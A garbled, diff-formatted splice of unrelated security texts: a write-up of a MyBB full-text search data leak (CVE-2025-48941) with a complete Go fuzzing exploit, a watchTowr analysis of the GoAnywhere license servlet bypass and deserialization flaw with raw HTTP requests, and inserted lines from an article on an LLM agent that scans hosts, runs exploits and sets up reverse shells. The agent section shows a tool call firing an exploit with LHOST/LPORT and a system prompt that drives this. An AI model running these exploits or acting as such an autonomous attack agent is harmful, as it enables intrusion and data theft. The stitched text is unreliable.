-| ()        | Grouping subpatterns   | Grouping subexpressions  |
-| []        | any character in the set | No special meaning           |
-| {n,m} | between n and m           | No special meaning           |
-| ""       | No special meaning        | exact sequence of words  |
-| <       | No special meaning        | increases weight of term    |
-| >       | No special meaning         | decreases weight of term  |
-| ~       | No special meaning         | same as decrease weight |
-_________________________________________________
-Example query from MySQL Doc, which shows queries containing MySQL and not
-containing YourSQL:
-mysql> SELECT * FROM articles WHERE MATCH (title,body)
-    -> AGAINST ('+MySQL -YourSQL' IN BOOLEAN MODE);
-_____________________________________
-| id | title                                    | body               |
-++++++++++++++++++++++++++++++++++++
-|  1 | MySQL Tutorials For         | DBMS stands |
-|  2 | How To Use MySQL Well | After you went |
-|  3 | Optimizing MySQL in the | In this tutorial   |
-|  4 | 1001 MySQL Tricks          | 1. Never run    |
-|  6 | MySQL Security               | When configu. |
-_____________________________________
-
-I think you see the problem now, there aren't any special implementations
-that would prevent these special operators (custom regex) from executing and
-the query itself is in quotes. So, we found something that:
-1. Doesn't require any escape
-2. Isn't identified by WAFs/SASTs/DASTs or anything else
-3. Has the possibility of leaking data
-
-Now the pros against REGEXP, RLIKE, LIKE and normal search:
-1. No one calls it regex, so input often won't be sanitized against
-   asterisks, etc.
-2. Has logic which might come in handy if needed
-
-The attack vector on which we should focus is Search functions, especially
-the ones which show "name" but don't show content, or show "count" of
-documents that contain a "content". Basically, anything that gives you an
-idea of the word "contains".
-
-Obviously, this kind of stuff isn't about theory, it is about practice. So
-I downloaded a list of open source web applications using a database and
-identified this pattern in some of them. The quickest and only fix at the
-moment was done by myBB team and identified as CVE-2025-48941. Before going
-further, here is a list of similar functions in other DBMSs.
-
-DBMS            | Full-text function / predicate
-_______________________________________________________________
-MySQL          | MATCH(col) AGAINST ('+python -java' IN BOOLEAN MODE)
-PostgreSQL  | to_tsvector(col) @@ to_tsquery('python & !java') or
-                      | @@ websearch_to_tsquery('python -java')
-SQL Server   | CONTAINS(col, ' "python" AND NOT "java" ')
-Oracle DB     | CONTAINS(col, 'python AND NOT java') > 0
-IBM Db2        | CONTAINS(col, '"python" & !"java"') =1
-_______________________________________________________________
-
---[ 4 - Study Case: myBB
-This section covers analysis of CVE-2025-48941. In my test env I enabled
-FTS. I put "Search Flood Time (seconds)" to 0, to ease my work, having
-multiple accounts or using proxies would provide the same effect (this value
-isn't crucial, it is only for the exploit to work faster), and I have 2
-deleted threads with titles "jackie chan" and
-"0ce3266d4eb71ad50f7a90aee6d21dcd"
-
-----[ 4.1 - Identification
-Deleted threads are visible to an admin when searching, and the search
-function is the same for an admin and a user, so the question is, what will
-be visible exactly?
-
-The `perform_search_mysql_ft` uses MATCH AGAINST functions when searching.
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-$message_lookin = "AND MATCH(message) AGAINST('"
-  .$db->escape_string($keywords)."' IN BOOLEAN MODE)";
-$subject_lookin = "AND MATCH(subject) AGAINST('"
-  .$db->escape_string($keywords)."' IN BOOLEAN MODE)";
---------------------------------------------------------------------------
-It is seen that there are 2 main options to MATCH AGAINST, message or
-subject. But before going into this, we have to understand how keywords are
-passed.
-
-Firstly, `perform_search_mysql_ft` takes the keyword and passes it into the
-`clean_keywords_ft` function
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-function perform_search_mysql_ft($search)
-{
-    global $mybb, $db, $lang;
-
-    $keywords = clean_keywords_ft($search['keywords']);
---------------------------------------------------------------------------
-
-----[ 4.2 - Perfect Match Against Sanitization
-So I am searching for "jack*". My "jack*" transformed into "jack"; to
-understand the reason, let's check the `clean_keywords_ft` function itself.
-In basic regex:
-------------------
-(\b.{1,2})(\s)|(\b.{1,2}$)
-------------------
-As you can see, it has \b (word boundary) which exists in these positions:
-* Between a "word character" and a "non-word character" (which is anything
-  not \w, like *, (, +, space, etc.).
-* Between a "non-word character" and a "word character".
-* At the beginning of the string if the first character is a \w.
-* At the end of the string if the last character is a \w.
-Because of the first reason, the asterisk gets replaced.
-
-To bypass it, I can simply add "ZZ" at the end. Because .{1,2}$ matches the
-last 1 or 2 characters. And now that the string is "jack*ZZ", the "*ZZ" part
-is between a "non-word character"(*) and a "word character" (ZZ). So the
-word character (ZZ) gets replaced and "jack*ZZ" becomes "jack*".
-
-After the `clean_keywords_ft` function, our keyword will be passed inside:
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-$word = str_replace(array("+", "-", "*"), '', $word);
---------------------------------------------------------------------------
-
-So our asterisk gets replaced again. Now to bypass it I will use 2 keywords;
-the first keyword will be "&&&&&". There is no special reason for that, I
-just need an extra keyword which will be ignored by MATCH AGAINST.
---------------------------------------------------------------------------
-mysql> SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND
-    -> MATCH(subject) AGAINST('+&&&&& +jack*' IN BOOLEAN MODE);
-+-----+-----------+
-| tid | firstpost |
-+-----+-----------+
-|   2 |         2 |
-+-----+-----------+
-1 row in set (0.00 sec)
---------------------------------------------------------------------------
-
-This one seems to be working. So I am passing &&&&& +jack*ZZ as input so
-that it would be converted into +&&&&& +jack*. The second asterisk won't get
-removed, and here is the reason:
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-function perform_search_mysql_ft($search)
-{
-    global $mybb, $db, $lang;
-    $keywords = clean_keywords_ft($search['keywords']);
-    if($mybb->settings['minsearchword'] < 1)
-    {
-        $mybb->settings['minsearchword'] = 4;
-    }
-    $message_lookin = $subject_lookin = '';
-    if($keywords)
-    {
-        $keywords_exp = explode("\"", $keywords);
-        $inquote = false;
-        foreach($keywords_exp as $phrase)
-        {
-            if(!$inquote)
-            {
-                $split_words = preg_split("#\s{1,}#", $phrase, -1);
-                foreach($split_words as $word)
-                {
-                    $word = str_replace(array("+", "-", "*"), '', $word);
-                    if(!$word)
-                    {
-                        continue;
-                    }
-                    if(my_strlen($word) < $mybb->settings['minsearchword'])
-                    {
-                        $all_too_short = true;
-                    }
-                    else
-                    {
-                        $all_too_short = false;
-                        break;
-                    }
-                }
-            }
---------------------------------------------------------------------------
-The `split_words` array will be: `0=>"+&&&&&"`, `1=> "+jack*"`. The
-`foreach` loop will process "+&&&&&" first and it will become "&&&&&".
-Because '+', '-', and '*' get replaced with nothing. Then, if the length of
-"&&&&&" is less than `minsearchword` (which is 4 and was set inside
-`perform_search_mysql_ft`), it will continue the `foreach` loop; otherwise,
-it will set `all_too_short` to false and break the `foreach` loop. In our
-case, the length is 5, and it breaks the `foreach` loop, because of which
-our second word, "+jack*", won't even get replaced. Later, it will be passed
-into MATCH AGAINST
-
-----[ 4.3 - Exploiting
-The query, as you can see, has a response showing the tid and firstpost. The
-reason why this works for the title and not for the content is because of
-"p.visible = 1" and "t.visible = 1", but we will come to that later.
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-    else
-    {
-        $query = $db->query("
-            SELECT t.tid, t.firstpost
-            FROM ".TABLE_PREFIX."threads t
-            WHERE 1=1 {$thread_datecut} {$thread_replycut}
-              {$thread_prefixcut} {$forumin} {$thread_usersql} {$permsql}
-              {$visiblesql} {$subject_lookin}
-            {$limitsql}
-        ");
-        while($thread = $db->fetch_array($query))
-        {
-            $threads[$thread['tid']] = $thread['tid'];
-            if($thread['firstpost'])
-            {
-                $firstposts[$thread['tid']] = $thread['firstpost'];
-            }
-        }
-        if(count($threads) < 1)
-        {
-            error($lang->error_nosearchresults);
-        }
-        $threads = implode(',', $threads);
-        $firstposts = implode(',', $firstposts);
-        if($firstposts)
-        {
-            $query = $db->simple_select("posts", "pid", "pid IN
-              ($firstposts) {$plain_post_visiblesql} {$limitsql}");
-            while($post = $db->fetch_array($query))
-            {
-                $posts[$post['pid']] = $post['pid'];
-            }
-            $posts = implode(',', $posts);
-        }
-    }
-    return array(
-        "threads" => $threads,
-        "posts" => $posts,
-        "querycache" => ''
-    );
---------------------------------------------------------------------------
-Query in DB:
---------------------------------------------------------------------------
-mysql> SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND
-    -> MATCH(subject) AGAINST('+&&&&& +jack*' IN BOOLEAN MODE);
-+-----+-----------+
-| tid | firstpost |
-+-----+-----------+
-|   2 |         2 |
-+-----+-----------+
-1 row in set (0.00 sec)
---------------------------------------------------------------------------
-Now the MOST important part here is
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-        if(count($threads) < 1)
-        {
-            error($lang->error_nosearchresults);
-        }
---------------------------------------------------------------------------
-If the response has no result, it will open "error_nosearchresults";
-otherwise, it will REDIRECT. This is why it is possible to identify title
-name, without seeing it. If I get a redirect when using "jack*", it means
-that there is a title that starts with "jack", otherwise it would directly
-open "error_nosearchresults". Now inside upload/search.php, we see this
-line, which shows where we get redirected. The thing is, we wouldn't have
-been able to reach this line if the response from MySQL had been empty.
-----------------------------------
-/upload/search.php
-
-redirect("search.php?action=results&sid=".$sid."&sortby=".$sortby."&order="
-  .$sortorder, $lang->redirect_searchresults);
-----------------------------------
-
-It is possible to exploit this vulnerability by fuzzing. The logic here is:
-I start with a*, then aa*, ab*, ac*, and so on. In a real-world scenario,
-an attacker would have multiple accounts, or proxies. In the test
-environment I just put "Search Flood Time (seconds)" to 0. Basic script:
-
---------------------------------------------------------------------------
-package main
-
-import (
-    "fmt"
-    "io"
-    "net/http"
-    "os"
-    "strings"
+Agent Action: execute_shell_command(
+    "python3 12345.py 192.168.1.100 LHOST=192.168.1.50 LPORT=4444"
 )
+Observation: "Exploit executed. Check listener log."
 
-const fuzzChars = "abcdefghijklmnopqrstuvwxyz0123456789"
-const queryTemplate = "search.php?action=do_search&keywords=%26%26%26%26%26"
-  + "+%2B{FUZZ}*xD&postthread=2&author=&matchusername=1&forums%5B%5D=all"
-  + "&findthreadst=1&numreplies=&postdate=0&pddir=1&sortby=lastpost"
-  + "&sortordr=desc&showresults=threads&submit=Search"
-const successIndicator = "end: redirect"
-const maxFuzzPayloadLength = 50
+Agent Thought: "The exploit has been executed. Based on the output, 
+               the connection attempt was made. The user should check 
+               listener_4444.log for the shell."
+You might be thinking: “Can such a small model really handle this complexity?”Short answer: Yes, surprisingly well.Here’s why Qwen3:1.7b works for this use case:The model doesn’t need to “know” how to hack—it just needs to:Parse structured output (nmap, searchsploit JSON)Follow sequential instructionsReason about dependencies (“I need scan results before searching”)Read and understand basic code patterns2. Constrained Problem SpaceUnlike general chat, we’re operating in a :Clear workflow (scan → search → mirror → inspect → execute)In my testing, Qwen3:1.7b:✅ Successfully chains 5+ tool calls✅ Parses nmap output accurately✅ Identifies service versions✅ Reads and understands Python exploit code✅ Distinguishes reverse vs bind shells❌ Sometimes needs retries for complex exploits❌ May struggle with ambiguous service namesThe Secret Sauce: System PromptingThe system prompt is . Here’s why mine works:STRICTLY FOLLOW THIS ORDER:
+1. Scan the target using `scan_target`. WAIT for the results.
+2. ANALYZE the scan results...
+Small models need . No implicit steps.c. IF it is a **Reverse Shell** (requires local listener):
+   - Identify the port it connects back to (LPORT).
+   - If hardcoded, use `start_listener` on that port.
+I explicitly teach the agent .**WAIT**, **ANALYZE**, **ONLY AFTER**, **DETERMINE**
+Emphasis helps small models focus on critical instructions.Do NOT call `search_exploits` until you have received 
+the output from `scan_target`.
+Anticipate common mistakes and preemptively prevent them.Building this wasn’t smooth sailing. Here are the biggest challenges:: Early versions would try to mirror exploits before searching for them.Challenge 2: JSON Parsing Errors: Searchsploit JSON sometimes has edge cases.Always handle malformed output gracefully.Challenge 3: Reverse vs Bind Shell Detection: Agent struggled to determine if listener needed.Challenge 4: Background Listener Management: Netcat listeners blocking the main process.Challenge 5: Model Context Length: Full exploit code can be 500+ lines.This is just v1.0. Here’s my roadmap:1. Multi-Exploit OrchestrationCurrently handles one exploit at a time. Future version:2. Privilege Escalation Module3. Exploit Success Detection4. Exploit Database TrainingFine-tune the model on exploit-db descriptions:5. Memory/State Persistence7. CVE Database IntegrationWant to run this yourself? Here’s how:apt nmap exploitdb netcat
 
-func min(a, b int) int {
-    if a < b {
-        return a
-    }
-    return b
-}
+searchsploit 
+python3  venv venv
+venv/bin/activate
 
-func main() {
-    if len(os.Args) < 2 {
-        fmt.Fprintln(os.Stderr, "Usage: go run test.go <base_url>")
-        fmt.Fprintln(os.Stderr, "Example: go run test.go http://127.0.0.1")
-        os.Exit(1)
-    }
-    baseURL := strings.TrimSuffix(os.Args[1], "/")
 
-    fmt.Printf("Target base URL: %s\n", baseURL)
-    fmt.Printf("Fuzzing characters: %s\n", fuzzChars)
-    fmt.Printf("Max fuzz payload length: %d\n", maxFuzzPayloadLength)
-    fmt.Println("---")
+pip langchain-core langgraph langchain-ollama
 
-    client := &http.Client{
-        CheckRedirect: func(req *http.Request, via []*http.Request) error {
-            return nil
-        },
-    }
+curl  https://ollama.com/install.sh | sh
 
-    var allFoundSuccessfulPayloads []string
-    var payloadsToTestThisRound []string
 
-    for _, charRune := range fuzzChars {
-        payloadsToTestThisRound = append(payloadsToTestThisRound,
-          string(charRune))
-    }
+ollama pull qwen3:1.7b
 
-    for currentLength := 1; currentLength <= maxFuzzPayloadLength;
-      currentLength++ {
-        if len(payloadsToTestThisRound) == 0 {
-            fmt.Printf("No more payloads to test. Stopping as no payloads" +
-              " generated for length %d.\n", currentLength)
-            break
-        }
 
-        fmt.Printf("--- Testing payloads of length %d (found %d to test)" +
-          " ---\n", currentLength, len(payloadsToTestThisRound))
-        var successfulPayloadsFoundThisRound []string
+ollama list
+Running the Exploit System
+python genai_exploiter.py
 
-        for _, fuzzPayload := range payloadsToTestThisRound {
-            fuzzedQuery := strings.Replace(queryTemplate, "{FUZZ}",
-              fuzzPayload, 1)
-            fullURL := baseURL + "/" + fuzzedQuery
-           
-            urlToPrint := fullURL
-            if len(urlToPrint) > 120 {
-                urlToPrint = urlToPrint[:117] + "..."
-            }
-            fmt.Printf("Testing payload: '%s' (URL: %s)\n", fuzzPayload,
-              urlToPrint)
 
-            req, err := http.NewRequest("GET", fullURL, nil)
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error creating request for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
+python genai_exploiter.py 192.168.1.100
 
-            resp, err := client.Do(req)
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error making GET request for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
 
-            bodyBytes, err := io.ReadAll(resp.Body)
-            resp.Body.Close()
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error reading response body for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
+python genai_exploiter.py 192.168.1.100 22,80,443
+Welcome to GenAI Exploit System
+Enter target IP/Hostname: 192.168.1.100
 
-            bodyString := string(bodyBytes)
-            if strings.Contains(bodyString, successIndicator) {
-                fmt.Printf("  SUCCESS! Payload: '%s' (Status: %s)." +
-                  " Response contains '%s'.\n", fuzzPayload, resp.Status,
-                  successIndicator)
-                allFoundSuccessfulPayloads = append(allFoundSuccessfulPayloads,
-                  fuzzPayload)
-                successfulPayloadsFoundThisRound =
-                  append(successfulPayloadsFoundThisRound, fuzzPayload)
-            }
-        }
+Processing: Scan 192.168.1.100 and find and attempt to verify exploits.
 
-        if currentLength < maxFuzzPayloadLength {
-            if len(successfulPayloadsFoundThisRound) == 0 {
-                fmt.Printf("No successful payloads found at length %d." +
-                  " Stopping further iterations.\n", currentLength)
-                payloadsToTestThisRound = []string{}
-            } else {
-                var nextPayloads []string
-                for _, prefix := range successfulPayloadsFoundThisRound {
-                    for _, charRune := range fuzzChars {
-                        nextPayloads = append(nextPayloads,
-                          prefix+string(charRune))
-                    }
-                }
-                payloadsToTestThisRound = nextPayloads
-                if len(payloadsToTestThisRound) == 0 &&
-                  len(successfulPayloadsFoundThisRound) > 0 {
-                    fmt.Println("Warning: Generated empty next set of" +
-                      " payloads despite successes in current round. This" +
-                      " might happen if fuzzChars is empty. Stopping.")
-                    break
-                }
-            }
-        } else {
-            fmt.Printf("Reached max payload length of %d.\n",
-              maxFuzzPayloadLength)
-        }
-    }
-
-    fmt.Println("--- Fuzzing Complete ---")
-    if len(allFoundSuccessfulPayloads) > 0 {
-        fmt.Printf("Found %d successful payload(s) in total:\n",
-          len(allFoundSuccessfulPayloads))
-        for _, p := range allFoundSuccessfulPayloads {
-            fmt.Printf("  - %s\n", p)
-        }
-    } else {
-        fmt.Println("No successful payloads found.")
-    }
-}
---------------------------------------------------------------------------
-
---[ 5 - Acknowledgements
-Thanks to the MyBB team, especially to Devilshakerz for the fast
-remediation!
-
---[ 6 - References
-[ 0 ] https://en.wikipedia.org/wiki/Regular_expression
-[ 1 ] https://en.wikipedia.org/wiki/Wildcard_character
-[ 2 ] https://owasp.org/www-community/attacks/Regular_expression
-_Denial_of_Service_-_ReDoS
-[ 3 ] https://www.imperva.com/learn/ddos/regular-expression-denial-of-
-service-redos/
-[ 4 ] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/
-Regular_expressions
-[ 5 ] https://dev.mysql.com/doc/refman/8.4/en/regexp.html
-[ 6 ] https://en.wikipedia.org/wiki/Full-text_search
-[ 7 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-boolean.html
-[ 8 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-search.html
-[ 9 ] https://github.com/mybb
-]]></content:encoded></item><item><title>New macOS threat abuses ads and social media to spread malware</title><link>https://moonlock.com/new-iphones-anti-spyware</link><author>/u/Individual-Gas5276</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 13:39:19 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Is This Bad? This Feels Bad. (GoAnywhere CVE-2025-10035) - watchTowr Labs</title><link>https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/</link><author>/u/dx7r__</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 13:04:10 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[File transfer used to be simple fun - fire up your favourite FTP client, log in to a glFTPd site, and you were done.Fast forward to 2025, and the same act requires a procurement team, a web interface, and a vendor proudly waving their  pledge. Ever seen the glFTPd developers on the list of pledge signers? Exactly.Welcome back to another watchTowr Labs analysis. This time, we are dissecting , a perfect CVSS 10.0 vulnerability in Fortra’s GoAnywhere MFT.For the uninitiated, GoAnywhere is a "secure" managed file transfer solution that automates and protects data exchange across enterprises, trading partners, and critical applications. Not your friend's photo-sharing setup. We are talking Fortune 500 deployments, with over 20,000 instances exposed to the Internet. A playground APT groups dream about.GoAnywhere has a history. In 2023, the cl0p ransomware gang turned CVE-2023-0669, a pre-auth command injection in the Licensing Response Servlet, into widespread compromise. That was the year of MFT exploitation trauma across multiple vendors, burned into the memory of defenders everywhere.As always, and you'll read, we have an inner feeling (call it "instinct") that there is more to this vulnerability that we are not yet being told.On Thursday, September 18, Fortra published a security advisory fi-2025-012 titled: Deserialization Vulnerability in GoAnywhere MFT's License Servlet.The title in itself is reason for alarm, with the description going further to explain how we likely got to a CVSS 10.0:A deserialization vulnerability in the License Servlet of Fortra's GoAnywhere MFT allows an actor with a validly forged license response signature to deserialize an arbitrary actor-controlled object, possibly leading to command injection.For those that recall the excitement of CVE-2023-0669, this description might feel.. familiar..:GoAnywhere MFT suffers from a pre-authentication command injection vulnerability in the License Response Servlet due to deserializing an arbitrary attacker-controlled objectBut watchTowr, how did this get a CVSS 10.0? The advisory clearly states meaningful hurdles for attackers to traverse:Exploitation of this vulnerability is highly dependent upon systems being externally exposed to the Internet.Fortra, should the advisory also note that the solution needs to be running?In The Wild Exploitation?As always, we must all play a game.The above sometimes happens when a vendor updates references attached to a CVE. In this case, FI-2025-011 was deleted, and FI-2025-012 was added to replace it.In FI-2025-012, a section was appended - an innocent "Am I Impacted?" section.Typically (not always...), when a vulnerability receives in-the-wild exploitation, clarity to customers is provided to help inform prioritisation and remediation process expectations.Fortra's advisory never says, “We’ve seen this exploited in-the-wild.” What they do say is more curious: check your Admin Audit logs, look for  in exception traces, and if you see it, you were “likely affected.”Affected, as in, vulnerable? Or affected like, the fox is already in the hen-house?To determine if you're "affected", Fortra provides an IoC (Indicator of ) for this ambiguous-state vulnerability. As discussed above, the advisory for FI-2025-012 includes a stack trace which will appear in your logs should you be "affected" by this vulnerability:ERROR Error parsing license response
-java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
-...
-at java.base/java.io.ObjectInputStream.readObject(Unknown Source)
-at java.base/java.security.SignedObject.getObject(Unknown Source)
-at com.linoma.license.gen2.BundleWorker.verify(BundleWorker.java:319)
-at com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:122)
-at com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)
-at com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)
-at com.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost(LicenseResponseServlet.java:64)
-We know Fortra wouldn't be ambiguous on purpose, though, because CISA's Secure By Design pledge, which Fortra signed up to, talks about transparency around ITW exploitation:Part 1 - License Servlet “Authentication” BypassThe initial vendor advisory was clear, immediately pointing to the culprit: the License Servlet. Key points from the advisory:The License Servlet contains an insecure deserialization vulnerability.According to the CVSS score, it’s reachable without authentication.So, first things first: can we actually hit the servlet and trigger the deserialization routine without credentials? To answer that, we need to crack open the code.The License Servlet lives in com.linoma.ga.ui.admin.servlet.LicenseResponseServlet and is exposed at:/goanywhere/lic/accept/<GUID>Let’s take a look at the entry point:public void doPost(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
-    String var3 = var1.getParameter("bundle"); // [1]
-    String[] var4 = var1.getRequestURI().split("/"); // [2]
-    String var5 = var4[var4.length - 1];
-    Object var6 = null;
-    if (!SessionUtilities.isLicenseRequestTokenValid(var5, var1.getSession())) { // [3]
-        LOGGER.error("Unauthorized bundle from invalid session: " + var3);
-        var2.sendError(400);
-        var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
-    } else {
-        try {
-            var9 = LicenseAPI.getResponse(var3); // [4]
-        } catch (Exception var8) {
-            LOGGER.error("Error parsing license response", var8);
-            var2.sendError(500);
-            var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
-            return;
-        }
-    //...
- }
-At  the servlet retrieves the  parameter from the HTTP request.At  it extracts a string from our URL - a GUID that defines the license request token.At  it calls SessionUtilities.isLicenseRequestTokenValid to validate the user-supplied license request token.If the check at  passes, the servlet calls  with the  parameter.So, how does token validation (the GUID) actually work? Well...The servlet takes the GUID token extracted at .It compares that token to the token that was stored on the user’s session.If both tokens match, the validation at  succeeds and execution proceeds to .If the tokens do not match, the flow stops - we never reach the deserialization code.So: without a valid token tied to the user session, we cannot even begin to reach the vulnerable deserialization routine.OK, We Need A Token - But How?Well, if your target GoAnywhere MFT instance has no license applied, this is trivial - you can head straight to the endpoint that starts the activation procedure, and a valid token will be applied to your session.However, this is not a production reality where licenses are inevitably provided - and this is not as simple. Typically, in such a case, you need to be authenticated to generate a valid license request token and attach it to your session.Our vulnerability is a perfect 10 CVSS, though, so logically there must be a way to obtain this token without any authentication. All of our analysis led us to the /goanywhere/license/Unlicensed.xhtml endpoint, where we discovered a few important items:We can bypass authentication requirements for this endpoint by appending  (or any other invalid data) to the endpoint, like so: /goanywhere/license/Unlicensed.xhtml/x .We need this endpoint to trigger an exception - for example, by providing an invalid , like this: /goanywhere/license/Unlicensed.xhtml/x?javax.faces.ViewState=x&GARequestAction=activateWhy, you ask? Because, in doing so, the application then flows to the  servlet, where all of our fun begins:protected void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
-    Integer var3 = (Integer)var1.getAttribute("javax.servlet.error.status_code");
-    String var4 = (String)var1.getAttribute("javax.servlet.error.message");
-    Class var5 = (Class)var1.getAttribute("javax.servlet.error.exception_type");
-    String var6 = (String)var1.getAttribute("javax.servlet.error.request_uri");
-    Throwable var7 = (Throwable)var1.getAttribute("javax.servlet.error.exception");
-    String var8 = var1.getRemoteAddr();
-    String var9 = var1.getParameter("GARequestAction");
-    if (var3 == null && var5 == null && var7 == null) {
-        var2.sendError(404);
-    } else if (!this.bypassHandling(var3, var6)) {
-        if (var6.startsWith(var1.getContextPath() + "/license/Unlicensed.xhtml")) { // [1]
-            if (StringUtilities.isNotEmpty(var9) && var9.equalsIgnoreCase("activate")) {
-                String var14 = SessionUtilities.generateLicenseRequestToken(var1.getSession()); // [2]
-
-                try {
-                        LicenseUtilities.requestOnlineActivation(var1, var2, var14); // [3]
-                        return;
-                    } catch (Exception var13) {
-                        this.LOGGER.error(var13.getMessage(), var13);
-                    }
-                }
-
-                var2.sendRedirect(var6);
-                //...
-}
-At , the code checks whether the request URL begins with /license/Unlicensed.xhtml.If it does, then at  the application generates a valid license-request token and attaches it to the session.Finally, at , the token is passed to LicenseUtilities.requestOnlineActivation. This method builds a redirect URL to the GoAnywhere license server, embedding the signed license request inside an HTTP GET  parameter.Now, for anyone who doesn’t live and breathe GoAnywhere MFT’s licensing process, the license request does two key things:It stores a serialized Java object containing the license-request token.It’s encrypted with hard-coded keys (and partially compressed for good measure).An attacker can simply send:GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&GARequestAction=activate HTTP/1.1
-Host: {{Hostname}}
-In response, the server redirects and returns a  parameter (the license request) — plus a cookie where the generated token has been attached.HTTP/1.1 302 
-...
-Location: <https://my.goanywhere.com:443/lic/request?bundle=p55wfyVKXDVM_bAVZtDLOg3PglFmtEOHyjm4vYZ9l2kwhyouIP6ieq_VZ6lJbVsf5J7KHr..... snip .....
-Because the encryption key is hard-coded, the  parameter value can be decrypted offline to recover the embedded GUID. Using said GUID, we are then able to interact with the License Servlet without "actually" authenticating:POST /goanywhere/lic/accept/d1a8b697-d68c-4e7d-b179-5f3b8b529e6f HTTP/1.1
-Host: {{Hostname}}
-Cookie: ASESSIONID=F970BB906F5F7D325BFC6E261CF87AE6;
-Content-Type: application/x-www-form-urlencoded
-
-bundle=inputhere
-There we have it - the "Authentication Bypass" portion of this vulnerability. Let's move on...Part 2 - Insecure Deserialization in License ServletNow that we can obtain the GUID token unauthenticated, we can reach the deserialization sink that this vulnerability ends with.For your sake, and our sanity, we are going to skip the majority of the code and leave you with two basic facts you need to know:The  parameter carries a serialized Java object that the server decrypts during processing.Decryption uses hard-coded keys, so the  parameter value is recoverable offline.Processing eventually reaches com.linoma.license.gen2.BundleWorker.verify, where the application hands us the raw input byte array derived from the .In short, an attacker-controlled serialized object reaches server-side deserialization logic.Let's step through com.linoma.license.gen2.BundleWorker.verify:private static byte[] verify(byte[] var0, KeyConfig var1) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
-    String var2 = "SHA1withDSA";
-    if ("2".equals(var1.getVersion())) {
-        var2 = "SHA512withRSA";
-    }
-
-    PublicKey var3 = getPublicKey(var1);
-    Signature var4 = Signature.getInstance(var2);
-    SignedObject var5 = (SignedObject)JavaSerializationUtilities.deserialize(var0, SignedObject.class, new Class[]{byte[].class}); // [1]
-    if (var1.isServer()) {
-        return ((SignedContainer)JavaSerializationUtilities.deserializeUntrustedSignedObject(var5, SignedContainer.class, new Class[]{byte[].class})).getData();
-    } else {
-        boolean var6 = var5.verify(var3, var4); // [2]
-        if (!var6) {
-            throw new IOException("Unable to verify signature!");
-        } else {
-            SignedContainer var7 = (SignedContainer)var5.getObject(); // [3]
-            return var7.getData();
-        }
-    }
-}
-This part can be a little confusing, so let’s stick to the key points.At  the code calls into a hardened deserialization wrapper (wrapping around ValidatingObjectInputStream.readObject from standard Apache libraries), to deserialize our data.It also supplies extra arguments, such as , which define the only types the routine will accept during deserialization.Those additional arguments restrict what types can be deserialized. In practice, this means the routine will only accept a java.security.SignedObject or a raw .So what is a ? According to the Java documentation:SignedObject is a class for the purpose of creating authentic runtime objects whose integrity cannot be compromised without being detected.More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.In simple terms, a  is just a wrapper. It stores a serialized object inside and a signature calculated over that stream with a private key alongside it.The class also provides a few helper methods: - uses the public key to check that the signature matches. - deserializes and returns the inner serialized object.At , the code will call  on our deserialized , immediately allowing an attacker to:Deliver a serialized .Which internally stores a malicious serialized object, like a one based on the  gadget.GoAnywhere will deserialize this inner object, and that’s it.Do you see what we missed? Look at .The code checks the signature of our serialized object against a public key baked into GoAnywhere. On paper, this is sensible. Signature validation is handled by Bouncy Castle and its FIPS API.So the final barrier to a pre-auth RCE is bypassing that signature check. But here’s the problem: we don’t know how. Really.Either we are missing a trick, or the check is genuinely solid. We tried:Using several private keys shipped in GoAnywhere to generate a valid signature. None of them matched the public key in play.Reviewing the Java code responsible for the signature verification.Chasing alternative code paths that might hit deserialization without needing this check.One might think: just diff the patch, you dummies.Here’s the kicker though. The patch  harden the deserialization routine, but the signature verification logic? Completely untouched.The patch doesn’t amend the signature check at all. Instead, it only changes the deserialization flow, replacing  with a custom wrapper called deserializeUntrustedSignedObject. The idea seems to be to add another layer of “safety” around deserialization.We’ve got a few conspiracy theories, though, all of which we have absolutely zero evidence for, and are complete conjecture. Regardless,you’re free to pick whichever one fits your mood: We somehow missed an obvious bypass for the signature verification routine. If that’s the case, why didn’t the patch touch it?  The private key leaked. Dramatic, yes, but possible. That would let attackers sign malicious objects that every GoAnywhere instance on the planet would happily accept.The vendor accidentally signed evil. Imagine this:When you activate your GoAnywhere product, your installation generates a serialized license request.It’s sent to the vendor’s license server ()If someone slipped a malicious object inside that request and the vendor blindly signed it, attackers would now have a perfectly valid signed payload that works everywhere.Fueling our conspiracy theories was the advisory deletion and 